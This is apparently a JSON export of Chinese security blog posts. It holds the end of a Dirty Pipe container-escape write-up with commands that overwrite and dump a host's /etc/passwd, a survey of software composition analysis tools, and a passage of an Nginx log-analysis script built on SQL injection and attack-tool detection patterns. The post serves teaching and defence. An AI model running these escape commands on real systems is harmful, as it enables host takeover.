可以拆分为两个系统调用1 name_to_handle_at() 用于得到目标文件的句柄open_by_handle_at() 根据传入的文件句柄打开目标文件，得到文件描述符\n• CAP_DAC_READ_SEARCH 的权限包括绕过读取文件和文件夹的权限检查、执行 open_by_handle_at() 系统调用\n• 若容器被赋予 CAP_DAC_READ_SEARCH，则能绕过容器隔离，遍历宿主机文 件系统并读取任意文件\n\n\n\n\n\n\n\n\n\n文件句柄在 64 位系统中，文件句柄长度为 8 个字节，其中前 4 个字节为文 件的 inode 号\n\n若容器被赋予 CAP_DAC_READ_SEARCH，攻击者可在容器内 部遍历宿主机 inode，找到目标文件 inode 号(占据句柄前 4 字节)\n\n随后暴力破解文件句柄后 4 字节，即可找到指向该文件的句柄\n\n最后调用 open_by_handle_at() 即可通过该句柄打开目标文件， 得到文件描述符\n\n\n0x02 漏洞利用项目地址\ncp &#x2F;etc&#x2F;password . # back up &#x2F;etc&#x2F;password\ngcc dp.c -o dp\ndocker run --rm -it -v $(pwd):&#x2F;exp --cap-add&#x3D;CAP_DAC_READ_SEARCH ubuntu\n&#x2F;exp&#x2F;dp &#x2F;etc&#x2F;passwd 1 ootz: # overwrite &#x2F;etc&#x2F;password on host from offset 1\n&#x2F;etc&#x2F;dp &#x2F;etc&#x2F;passwd # dump &#x2F;etc&#x2F;passwd on host\n0x03 总结\n将 CVE-2022-0847 漏洞与已有 CAP_DAC_READ_SEARCH 逃逸路径结合，容器内部能覆写宿主机上的只读文件\n\n仅能写入页缓存，若缓存没有写回，则不能实现持久化，缓存失效&#x2F;重启后文件恢复\n\n\n0x04 References0x05 关于漏洞的思考\n 待验证\n\n","slug":"利用CVE-2022-0847（Dirty Pipe）实现容器逃逸","date":"2022-06-18T08:37:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"CVE-2022-0847,DirtyPipe,容器逃逸,漏洞分析","author_index":"Moses"},{"id":"e996202d66a481abb2ff37739071b61f","title":"SCA软件成分分析前期探索","content":"SCA软件成分分析前期探索概述和背景SCA概念SCA(Software Composition Analysis)软件成分分析技术主要就是针对开源软件以及第三方商业软件设计的各种源码、源码库、模块和框架，识别和清点开源软件的组件及其构成和依赖关系，并识别已知的安全漏洞或潜在的许可授权问题，争取在应用系统上线前发现并解决这些风险。它有助于确保企业软件供应链仅包含安全的组件，从而支持安全应用程序开发和组装。\nSCA需求\n支持多种语言的深度扫描能力\n具备CI&#x2F;CD集成自动化能力，并且将其扫描结果作为交付质量关卡、保证软件交付质量\n具备可视化漏洞分析报表和license报表，以可视化漏洞的监管能力和可视化企业使用license的情况\n拥有对开源漏洞数据库、商业漏洞数据库、本地漏洞数据中心和其他漏洞扫描工具的集成能力，通过不同的漏洞数源丰富SCA工具对第三方安全漏洞的判断能力\n能够进行正向依赖分析从而定位漏洞位置，以及进行反向依赖分析自动化地分析漏洞的影响范围\n自定义告警配置、通知和自动化能力，以提供企业漏洞的快速响应能力\n\n漏洞数据库google 开源洞见Open Source Insights是谷歌的一项实验项目，由Google 云平台提供。提供npm、Maven、PyPi、NuGut、Go等语言的开源软件包查询。查询结果包括项目信息：\n\n项目描述\nlink连接\nrepo\nhomepage\norgin\n\n\n版本信息\n开源协议\n事件历史项目安全信息：\n安全公告\n版本比较\nDependents\nDependencies\n\n\n同时，提供公共数据集，可以使用BigQuery查询分析使用，当然如果不考虑网络的问题也可以使用Grafana搭建分析视图Grafana的bigquery插件类似Linux开源基金会曾经的一个项目metrics进阶-&gt;:谷歌 bigquery 配置代理\nbigquery-public-data.deps_dev_v1.ProjectsThe type of the project, example values include ‘APACHE_JIRA’, ‘BITBUCKET’, ‘GITHUB’ and ‘GITLAB’.\nbigquery-public-data.deps_dev_v1.PackageVersions\nbigquery-public-data.deps_dev_v1.Dependencies\nbigquery-public-data.deps_dev_v1.Advisories\nlicense查询查询结果\n&#123; &quot;System&quot;: &quot;CARGO&quot;, &quot;License&quot;: &quot;MIT&quot;, &quot;NPackages&quot;: &quot;36775&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;CARGO&quot;, &quot;License&quot;: &quot;Apache-2.0 OR MIT&quot;, &quot;NPackages&quot;: &quot;22671&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;CARGO&quot;, &quot;License&quot;: &quot;Apache-2.0&quot;, &quot;NPackages&quot;: &quot;9958&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;GO&quot;, &quot;License&quot;: &quot;MIT&quot;, &quot;NPackages&quot;: &quot;216790&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;GO&quot;, &quot;License&quot;: &quot;Apache-2.0&quot;, &quot;NPackages&quot;: &quot;108678&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;GO&quot;, &quot;License&quot;: &quot;BSD-3-Clause&quot;, &quot;NPackages&quot;: &quot;28823&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;MAVEN&quot;, &quot;License&quot;: &quot;Apache-2.0&quot;, &quot;NPackages&quot;: &quot;263361&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;MAVEN&quot;, &quot;License&quot;: &quot;MIT&quot;, &quot;NPackages&quot;: &quot;75302&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;MAVEN&quot;, &quot;License&quot;: &quot;non-standard&quot;, &quot;NPackages&quot;: &quot;68080&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;NPM&quot;, &quot;License&quot;: &quot;MIT&quot;, &quot;NPackages&quot;: &quot;3229651&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;NPM&quot;, &quot;License&quot;: &quot;ISC&quot;, &quot;NPackages&quot;: &quot;1003365&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;NPM&quot;, &quot;License&quot;: &quot;Apache-2.0&quot;, &quot;NPackages&quot;: &quot;235446&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;PYPI&quot;, &quot;License&quot;: &quot;MIT&quot;, &quot;NPackages&quot;: &quot;105168&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;PYPI&quot;, &quot;License&quot;: &quot;non-standard&quot;, &quot;NPackages&quot;: &quot;50207&quot;&#125;\n\n&#123; &quot;System&quot;: &quot;PYPI&quot;, &quot;License&quot;: &quot;Apache-2.0&quot;, &quot;NPackages&quot;: &quot;22749&quot;&#125;\nCPE开放数据CPECPE（Common Platform Enumeration，CPE国家漏洞数据库）数据库是一个包含产品、其版本、供应商等信息的列表。要实现SCA，必须获得CPE和CVE的通信信息。\nCPE和CVE数据-API在官方网站国家脆弱性数据库上找到CPE数据库和CVE合规性。获取必要信息的方法之一是使用Rest API。这里描述了它。例如，以下查询允许我们获取CPE数据库的前20个元素，包括相应的CVE：测试以下是ActivePerl的CPE示例：\n&#123; &quot;deprecated&quot;: false, &quot;cpe23Uri&quot;: &quot;cpe:2.3:a:activestate:activeperl:-:*:*:*:*:*:*:*&quot;, &quot;lastModifiedDate&quot;: &quot;2007-09-14T17:36Z&quot;, &quot;titles&quot;: [ &#123; &quot;title&quot;: &quot;ActiveState ActivePerl&quot;, &quot;lang&quot;: &quot;en_US&quot; &#125; ], &quot;refs&quot;: [], &quot;deprecatedBy&quot;: [], &quot;vulnerabilities&quot;: [ &quot;CVE-2001-0815&quot;, &quot;CVE-2004-0377&quot; ] &#125;\n这里最重要的部分是“cpe23Uri”值。它以某种格式为我们提供了重要信息，当然还有“漏洞”（尽管它们不是CPE列表的一部分）。为了简单起见，我们将“cpe23Uri”字符串读作\ncpe:2.3:a:&lt;vendor&gt;:&lt;product&gt;:&lt;version&gt;:&lt;update&gt;:...\n根据规范，代替其中一个片段的连字符意味着逻辑“NA”值。这可以解释为“值未设置”。代替片段的“*”字符意味着“任何”。\n当我们实现基于CPE的解决方案时，主要困难是为每个依赖项找到正确的元素。这里的问题是，库名称（在我们解析项目链接时获得）可能与相应的CPE条目不匹配。例如，CPE列表有以下“cpe23Uri”的条目：\ncpe:2.3:a:microsoft:asp.net_model_view_controller:2.0:*:*:*:*:*:*:* cpe:2.3:a:microsoft:asp.net_model_view_controller:3.0:*:*:*:*:*:*:* cpe:2.3:a:microsoft:asp.net_model_view_controller:4.0:*:*:*:*:*:*:* cpe:2.3:a:microsoft:asp.net_model_view_controller:5.0:*:*:*:*:*:*:* cpe:2.3:a:microsoft:asp.net_model_view_controller:5.1:*:*:*:*:*:*:*\n\n\n\n\n\n\n\n\n\n要检测 jar 包存在的漏洞，首先要有准确且足够全的漏洞库，最好能够契合 maven 坐标。NVD 漏洞最全，但以 cpe 格式标识漏洞的影响软件，使得建立 cpe 和 maven 坐标的对应关系比较麻烦。 DependencyCheck(https://github.com/jeremylong/DependencyCheck) 基于 NVD 漏洞库通过计算相似度来关联依赖和 cpe，不可避免的会存在误报和漏报。\nCPE和CVE数据-数据源数据源NVD - Data Feeds\n\nCPE: https://nvd.nist.gov/feeds/xml/cpe/dictionary/official-cpe-dictionary_v2.3.xml.gz\nCWE: https://cwe.mitre.org/data/xml/cwec_latest.xml.zip\nCVE:\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2021.json.gz\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2020.json.gz\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2019.json.gz\n[…]\nhttps://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-2002.json.gz\n\n\n\nAPI和数据源类型名词解释\n\n1.漏洞库：即漏洞数据库，主要是只大型的、公开的、业界公认的漏洞数据库。比如NVD、CNVD、exploit-db等。\n2.CVE ：即为每个漏洞确定了唯一的名称，通过它能帮助安全从业人员快速地在漏洞数据库中找到相应的漏洞信息。\n3.CPE ：即漏洞所关联的产品、版本、依赖路径或命名规范等信息，通过此信息，可以知道某个CVE所影响的组件版本和所在产品的依赖路径。\n4.CWE ：即漏洞的类型，比如某3个组件都存在SQL注入漏洞，这3个漏洞的CVE并不相同，但CWE都可描述为CWE-89 SQL注入类型的漏洞。\n5.CVSS ：即通用漏洞评分系统，通过对漏洞进行评分，来定义威胁的高、中、低以便区别，辅助制定漏洞修复策略。\n\n\n\n\n类型\n描述\n\n\n\nCVE和CPE API\n传统漏洞数据提要文件的替代品。与JSON漏洞提要和CPE匹配提要相比，API要灵活得多，在单个界面中提供了更丰富的数据集。\n\n\nJSON脆弱性信息\n文件中的每个漏洞都包括来自CVE®词典提要的描述和相关参考链接，以及CVSS基本分数、易受攻击的产品配置和弱点分类。\n\n\nCPE比赛Feed\n根据官方CPE词典中的CPE匹配提供产品&#x2F;平台适用性声明到CPE URI匹配的提要。\n\n\nRSS漏洞Feed\n八天的安全相关软件缺陷窗口。\n\n\n漏洞翻译Feed\n漏洞提要的翻译。\n\n\n漏洞供应商评论\n供应商就影响产品内部的特定缺陷提供的评论。\n\n\nCPE词典\n包含产品列表的词典。\n\n\n通用配置枚举（CCE）参考数据\n常见配置项的参考数据。\n\n\n使用GitHub安全公告advisoryGitHub Advisory是在存储在GitHub上的开源项目中发现的漏洞数据库（CVE）。GitHub Advisory比CPE方便得多，[[SCA软件成分分析前期探索#google 开源洞见]]也使用该数据库。Google开源软件洞见数据库导出的500条advisory如下：\n要以编程方式访问GitHub Advisory，我们需要使用GraphQL API查询。Explorer - GitHub Docs\nsnyk 开源漏洞库Snyk Vulnerability Database | Snyk开源数据可以进行漏洞及开源软件查询,支持各种包管理器如Linux、maven、NPM等。该漏洞库以 groupId:artifactId 作为软件名称，以版本区间的方式表示影响范围，SCA 在检测漏洞时，仅需要从 mavenTree 中取出 jar 包版本与漏洞库中的版本区间作比较即可Snyk API · ApiaryAPI接口支持REST接口调用，📢API需要商业付费的用户或组织才能够使用，免费个人用户无权访问API付费计划\n开源第三方安全扫描工具SCASonatypeSoftware Supply Chain Security - DevSecOps Governance | SonatypeMaven Central Repository SearchSonatype OSS IndexREST API - The Central Repository Documentation\nOWASP Dependency-CheckOWASP Dependency-Check是一个用于扫描项目依赖项的SCA实用程序，用于识别项目依赖项并检查是否存在任何已知的、公开披露的漏洞；目前已支持Java、Ruby、.NET、NodeJs、Ruby、Python等语言编写的程序。并为C&#x2F;C++构建系统（autoconf和cmake）提供了有限的支持；另外，作为一款开源工具，在多年来的发展过程中已经支持与许多主流软件进行集成，比如Jenkins等；具备使用方便、落地简单等优势。Dependency-Check的依赖性检查可用于应用程序（及依赖库），执行检查时会将Common Platform Enumeration（CPE）国家漏洞库及NPM Public Advisories库下载到本地，再通过核心引擎中的一系列分析器检查项目依赖性，收集有关依赖项目的信息，然后根据收集的依赖项信息与本地的CPE&amp;NPM库数据进行对比，如果检查发现扫描的组件存在已知的易受攻击和漏洞则标识，最后生成报告进行展示。\n\n👑项目地址GitHub - jeremylong&#x2F;DependencyCheck: OWASP dependency-check is a software composition analysis utility that detects publicly disclosed vulnerabilities in application dependencies.\n👁WIKIHome · jeremylong&#x2F;DependencyCheck Wiki · GitHub\n📒Docsdependency-check – About[[dependency-check]]\n\nOWASP Dependency-TrackOWASP Dependency-Track是一个组件分析平台，Dependency-Track是OWASP推出的一个智能供应链组件分析平台，它集成了4种漏洞数据库：NPM Public Advisories、National Vulnerability Database、Sonartype OSS Index和VulnDB，相比于其他开源检测工具单一的漏洞库，Dependency Track出现漏报或者误报的情况会小很多。同时它提供了强大的API集成功能（如openAPI和Jenkins的插件），在开发安全建设过程中我们可以将其整合到我们的pipeline中帮助DevOps团队提高开发流程速度，同时还能控制外部组件的使用和它们可能造成的风险。此外通过maven收集仓库中所有依赖包的信息，记录各个开发团队的应用程序所使用的各种第三方依赖信息，以便进行依赖包管理（版本控制、漏洞管理等）。在开发过程中可以基于soner bug追踪的组件安全跟踪，甚至fortify这样的代码白盒review介入，并通过邮件、钉钉告警通知安全团队、开发团队。👑官网\n核心架构\n检测原理Dependency Track通过接收到生成的Software BOM(软件物料清单)[[软件物料清单SBOM]]，然后检查物料清单中的各个组件(以及当前清单中的版本)在漏洞数据库中是否存在已知安全漏洞的记录，并通过Dashboard展示出来。所以你需要先准备好一份SBOM清单，然后发送给Dependency Track，等待它完成扫描检测之后，然后在管理界面上查看结果。\n\n\n\n\n\n\n\n\n\nSBOM（Software Bill of Material）翻译之后称为软件物料清单。通俗的解释就是我们用到的所有第三方组件依赖（包括第三方组件自己所依赖的其他第三方组件，换句话讲，依赖的依赖）的信息清单，这些内容包括author、group, licenses, versions and copyright等数据。\n\n\n\n字段\nSPDX值\nSWID值\n\n\n\n供应商\n（3.5） PackageSupplier:\n @role (softwareCreator&#x2F;publisher),@name\n\n\n组件\n（3.1）PackageName:\n @name\n\n\n唯一标识\n（3.2）SPDXID:\n @tagID\n\n\n版本\n（3.3）PackageVersion:\n @version\n\n\n组件散列值\n（3.10）PackageChecksum:\n&#x2F;..&#x2F;@[hash-algorithm]:hash\n\n\n相互关系\n（7.1）Relationship:CONTAINS\n@rel,@href\n\n\nSBOM编辑人\n（2.8）Creator:\n @role (tagCreator),@name\n\n\n生成SBOM的工具有几个，其中比较有名的是CycloneDXOWASP CycloneDX Software Bill of Materials (SBOM) Standard是一个轻量级软件材料清单（SBOM）标准。一旦我们有了BOM文件，我们就可以手动或通过整合CI&#x2F;CD中的上传功能将其上传到Dependency-Track。Dependency track相当于一个漏洞库和分析引擎，它基于SBOM，在漏洞库中搜索，这样我们就可以获得比传统组件分析更完整、更复杂的信息。\nDependency Track VS Dependency check\nDependencyCheck更多是给开发团队使用的工具\nDependencyTrack更多的是给安全团队使用的工具\n企业或者组织中的安全团队可以借助DependencyTrack实现第三方组件的统一安全管理\nDependencyCheck只能对第三方组件做安全检测并生成报告，仅此而已\nDependencyTrack会保存历次第三方组件安全检测结果，你可以通过Dashboard了解或者追踪第三方组件的安全变化趋势\nDependencyTrack还提供了很多额外的功能，例如漏洞通知、全局审查第三方组件、审计第三方组件软件授权协议、API等等\n\n部署DependencyCheck支持3种部署方式，分别是容器化部署、自运行安装包，以及可以直接在Tomcat里运行的WebApp包。docker部署\n# 下载DependencyTrack镜像\n\ndocker pull owasp&#x2F;dependency-track\n\n# 创建并使用宿主机上的存储以避免数据丢失\ndocker volume create --name dependency-track\n\n# 在8080端口上运行DependencyTrack，默认账户密码admin&#x2F;admin\ndocker run -d -m 8192m -p 8080:8080 --name dependency-track -v dependency-track:&#x2F;data owasp&#x2F;dependency-track\n更换数据库（可选）\n# 1.根路径新建dependency-track目录，然后在该目录下新建application.properties文件，在文件中填写下面配置\n\nalpine.database.mode&#x3D;external\n\nalpine.database.url&#x3D;jdbc:postgresql:&#x2F;&#x2F;localhost:5432&#x2F;dtrack\n\nalpine.database.driver&#x3D;org.postgresql.Driver\n\nalpine.database.username&#x3D;dtrack\n\nalpine.database.password&#x3D;password\n\n# 2.使用命令docker-compose up重新启动一下，配置就生效了，启动时间可能略长。参考：https:&#x2F;&#x2F;docs.dependencytrack.org&#x2F;getting-started&#x2F;database-support&#x2F;\n卸载\ndocker rmi owasp&#x2F;dependency-track\n\ndocker rm dependency-track\n\ndocker volume rm dependency-track:&#x2F;data\n\t\nOpenSCA[[OpenSCA]]\n商业产品\t\n    \n\n\nCloudDefenseSCA - Software Composition Analysis\nVeraCodeSCA to Automate Security Scanning | Veracode\nSnkySnyk | Developer security | Develop fast. Stay secure.\nSynopsys-blackduckBlack Duck Software Composition Analysis (SCA) | Synopsys\nMendOpen Source Vulnerability Database | Mend\n最佳借鉴VIVO引入前检测第三方组件在引入阶段时，vivo千镜安全实验室会采用静态分析、动态自动分析和手工调试等多种方式，对第三方组件进行深度的安全和隐私评估，保障第三方组件不会存在侵害用户权益的行为。\n开源组件在引入阶段时，vivo千镜安全实验室通过构建开源组件风险知识库，将引入组件与风险知识库进行匹配，从License、安全、合规等多维度生成开源组件引入报告。\n引入后扫描由于vivo的应用程序众多，如果对所有代码仓及分支进行人工审查，无疑会消耗巨大的人力。因此，vivo千镜安全实验室开发了软件成分分析引擎，其中包含正向扫描与逆向检测两个子引擎。软件成分分析引擎通过CI集成自动化触发代码仓扫描，实现自动化分析检测。同时，通过风险管控流程触发风险处理流程，将扫描结果通知到各负责人，从而确保第三方组件的应用安全和开源组件的使用合规。\n正向扫描正向扫描引擎又称为源码扫描引擎，主要通过扫描代码仓的方式对各应用程序进行软件成分分析，进而扫描出应用程序所集成的第三方组件及开源组件。\n在进行正向扫描之前，需要对应用程序的资产以及第三方组件和开源组件的特征进行收集。应用程序的资产包括代码仓、负责人等信息；第三方和开源组件的特征主要包括开发商、负责人、版本、文件HASH等信息。\n正向扫描引擎包括gradle文件扫描、工程文件扫描以及代码片段扫描：\n\nGradle文件扫描指通过解析工程中gradle文件，获取通过gradle引入的第三方组件和开源组件；\n\n工程文件扫描指通过扫描工程中jar包或aar包，获取通过本地集成引入的第三方组件和开源组件；\n\n代码片段扫描指通过扫描源代码，将源代码中代码片段与开源组件的知识库进行比对，获取代码引入的开源组件。\n\n\n值得一提的是，正向扫描引擎能够检测出应用程序引入的第三方组件和开源组件的版本信息。当第三方组件和开源组件披露出安全漏洞时，能够通过正向扫描即时检测出引用问题组件的应用程序信息，从而提高安全响应效率。\t\n逆向检测逆向检测引擎主要通过对应用程序的反汇编路径使用特征指纹匹配的方式进行软件成分分析，进而扫描出应用程序所集成的第三方组件及开源组件。\n在进行逆向检测之前，需要对第三方组件和开源组件的特征进行收集。由于逆向扫描主要对应用程序的反汇编代码进行扫描，因此需要将加固的应用进行脱壳预处理。\n逆向扫描引擎对APK进行反汇编后，将反汇编的代码与组件的特征指纹进行匹配，从而得到扫描结果。\t\nReferences\n👑OWASP Top Ten and Software Composition Analysis (SCA)\nSecurity Content Automation Protocol | CSRC\n58安全应急响应中心|Java 供应链(依赖)安全检测实践\nAPI Products\nAPI Vulnerabilities\nGartner:SCA市场指南Site Unreachable\n软件成分分析（SCA）完全指南_开源_SEAL软件供应链安全_InfoQ写作社区\nGitHub - dependabot&#x2F;dependabot-core: 🤖 The core logic behind Dependabot’s update PR creation. For product feedback see: https://github.com/github/feedback/discussions/categories/dependabot-feedback\ndependabot DocsKeeping your dependencies updated automatically with Dependabot version updates - GitHub Docs\nwhat-an-sbom-can-do-for-you\n企业开源分析和思考\n没有免费午餐——再探移动互联网软件供应链安全\n\n","slug":"SCA软件成分分析前期探索","date":"2022-06-17T04:52:00.000Z","categories_index":"软件供应链安全","tags_index":"SCA,软件供应链安全,SBOM,开源漏洞库,安全","author_index":"Moses"},{"id":"ca8ec5f39f069a5397c4e6f4f192ade4","title":"开源WAF调研之产品选型-Nginx临时应急工具","content":"工具介绍此脚本是参考nmgxy&#x2F;klionsec修改而来,重新添加了一些特征，只用来临时救急，还是推荐到ELK或者Splunk中分析🎩项目地址GitHub - al0ne&#x2F;nginx_log_check: Nginx日志安全分析脚本\n功能\n统计Top 20 地址\nSQL注入分析\nSQL注入 FROM查询统计\n扫描器&#x2F;常用黑客工具\n漏洞利用检测\n敏感路径访问\n文件包含攻击\nHTTP Tunnel\nWebshell\n寻找响应长度的url Top 20\n寻找罕见的脚本文件访问\n寻找302跳转的脚本文件\n\n脚本#!&#x2F;usr&#x2F;bin&#x2F;env bash\n\necho &quot;&quot;\necho &quot; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &quot;\necho &quot; \\                 Nginx日志安全分析脚本 V1.0            &#x2F; &quot;\necho &quot; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &quot;\necho &quot; # 支持Nginx日志分析，攻击告警分析等                    &quot;\necho &quot; # author：al0ne                    &quot;\necho &quot; # https:&#x2F;&#x2F;github.com&#x2F;al0ne                    &quot;\necho -e &quot;\\n&quot;\n\n#如果存在多个access文件或者有多个access.x.gz 建议先zcat access*.gz &gt;&gt;access.log文件中\n#设置分析结果存储目录,结尾不能加&#x2F;\noutfile&#x3D;&#x2F;tmp&#x2F;logs\n#如果目录以存在则清空，未存在则新建目录\nif [ -d $outfile ]; then\n    rm -rf $outfile&#x2F;*\nelse\n    mkdir -p $outfile\nfi\n#设置nginx日志目录，结尾必须加&#x2F;\naccess_dir&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;\n#设置文件名，如果文件名为access那么匹配的是access*文件\naccess_log&#x3D;access\n#判断日志文件是否存在\nnum&#x3D;$(ls $&#123;access_dir&#125;$&#123;access_log&#125;* | wc -l) &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1\nif [ $num -eq 0 ]; then\n    echo &#39;日志文件不存在&#39;\n    exit 1\nfi\necho -e &quot;\\n&quot;\n\n# 验证操作系统是debian系还是centos\nOS&#x3D;&#39;None&#39;\nif [ -e &quot;&#x2F;etc&#x2F;os-release&quot; ]; then\n    source &#x2F;etc&#x2F;os-release\n    case $&#123;ID&#125; in\n    &quot;debian&quot; | &quot;ubuntu&quot; | &quot;devuan&quot;)\n        OS&#x3D;&#39;Debian&#39;\n        ;;\n    &quot;centos&quot; | &quot;rhel fedora&quot; | &quot;rhel&quot;)\n        OS&#x3D;&#39;Centos&#39;\n        ;;\n    *) ;;\n    esac\nfi\n\nif [ $OS &#x3D; &#39;None&#39; ]; then\n    if command -v apt-get &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1; then\n        OS&#x3D;&#39;Debian&#39;\n    elif command -v yum &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1; then\n        OS&#x3D;&#39;Centos&#39;\n    else\n        echo -e &quot;\\n不支持这个系统\\n&quot;\n        echo -e &quot;已退出&quot;\n        exit 1\n    fi\nfi\n\n# 检测ag软件有没有安装\nif ag -V &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1; then\n    echo -e &quot;\\e[00;32msilversearcher-ag已安装 \\e[00m&quot;\nelse\n    if [ $OS &#x3D; &#39;Centos&#39; ]; then\n        yum -y install the_silver_searcher &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1\n    else\n        apt-get -y install silversearcher-ag &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1\n    fi\n\nfi\n#如果检测别的日志请手动替换偏移，例如awk的$7代表url，$9代表状态码，$10代表长度,本脚本是以nginx日志为基础\n\necho &quot;分析结果日志：$&#123;outfile&#125;&quot;\necho &quot;Nginx日志目录：$&#123;access_dir&#125;&quot;\necho &quot;Nginx文件名：$&#123;access_log&#125;&quot;\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]TOP 20 IP 地址\\e[00m&quot;\nag -a -o --nofilename &#39;\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;access_dir&#125;$&#123;access_log&#125;* | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;top20.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]SQL注入攻击分析\\e[00m&quot;\n#在SQL注入中排除掉了一些扫描css&#x2F;js&#x2F;png图片类等无用告警，并且重点筛选状态码200或者500的告警\nag -a &quot;xp_cmdshell|%20xor|%20and|%20AND|%20or|%20OR|select%20|%20and%201&#x3D;1|%20and%201&#x3D;2|%20from|%27exec|information_schema.tables|load_file|benchmark|substring|table_name|table_schema|%20where%20|%20union%20|%20UNION%20|concat\\(|concat_ws\\(|%20group%20|0x5f|0x7e|0x7c|0x27|%20limit|\\bcurrent_user\\b|%20LIMIT|version%28|version\\(|database%28|database\\(|user%28|user\\(|%20extractvalue|%updatexml|rand\\(0\\)\\*2|%20group%20by%20x|%20NULL%2C|sqlmap&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | ag -v &#39;&#x2F;\\w+\\.(?:js|css|html|jpg|jpeg|png|htm|swf)(?:\\?| )&#39; | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; &gt;$&#123;outfile&#125;&#x2F;sql.log\nawk &#39;&#123;print &quot;SQL注入攻击&quot; NR&quot;次&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;sql.log | tail -n1\necho &quot;SQL注入 TOP 20 IP地址&quot;\nag -o &#39;(?&lt;&#x3D;:)\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;outfile&#125;&#x2F;sql.log | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;sql_top20.log\n# 重点关注from查询，是否存在脱裤行为，排除扫描行为\necho &quot;SQL注入 FROM 查询&quot;\ncat $&#123;outfile&#125;&#x2F;sql.log | ag &#39;\\bfrom\\b&#39; | ag -v &#39;information_schema&#39; &gt;$&#123;outfile&#125;&#x2F;sql_from_query.log\nawk &#39;&#123;print &quot;SQL注入FROM查询&quot; NR&quot;次&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;sql_from_query.log | tail -n1\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]扫描器scan &amp; 黑客工具\\e[00m&quot;\nag -a &quot;acunetix|by_wvs|nikto|netsparker|HP404|nsfocus|WebCruiser|owasp|nmap|nessus|HEAD &#x2F;|AppScan|burpsuite|w3af|ZAP|openVAS|.+avij|.+angolin|360webscan|webscan|XSS@HERE|XSS%40HERE|NOSEC.JSky|wwwscan|wscan|antSword|WebVulnScan|WebInspect|ltx71|masscan|python-requests|Python-urllib|WinHttpRequest&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | ag -v &#39;&#x2F;\\w+\\.(?:js|css|jpg|jpeg|png|swf)(?:\\?| )&#39; | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; &gt;$&#123;outfile&#125;&#x2F;scan.log\nawk &#39;&#123;print &quot;共检测到扫描攻击&quot; NR&quot;次&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;scan.log | tail -n1\necho &quot;扫描工具流量 TOP 20&quot;\nag -o &#39;(?&lt;&#x3D;:)\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;outfile&#125;&#x2F;scan.log | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;scan_top20.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]敏感路径访问\\e[00m&quot;\nag -a 